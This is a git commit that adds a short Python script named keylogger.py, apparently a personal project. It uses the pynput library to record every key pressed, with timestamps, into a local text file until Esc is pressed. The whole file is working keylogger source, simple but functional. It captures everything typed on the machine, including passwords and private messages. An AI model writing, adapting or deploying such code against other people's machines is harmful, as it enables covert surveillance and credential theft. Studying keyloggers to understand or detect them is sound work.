0690aa3046337e96a1ef48fafe5f0128e611f113
Debasish Nandy <70640274+JokaDPiero@users.noreply.github.com>
2021-03-05 17:50:44 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,17 @@
+from pynput.keyboard import Key,Listener
+import logging
+import getpass
+
+logging.basicConfig(filename="C:/Users/KIIT/Downloads/Github/Keylogger/key_log.txt",filemode='a',
+                    level=logging.DEBUG,format='%(asctime)s:%(message)s:',datefmt='%m/%d/%Y %I:%M:%S%p')
+
+def on_press(key):
+    try:
+        logging.info(str(key))
+        if key==Key.esc:
+            return False #(stop listening)
+    except Exception as e:
+        pass
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
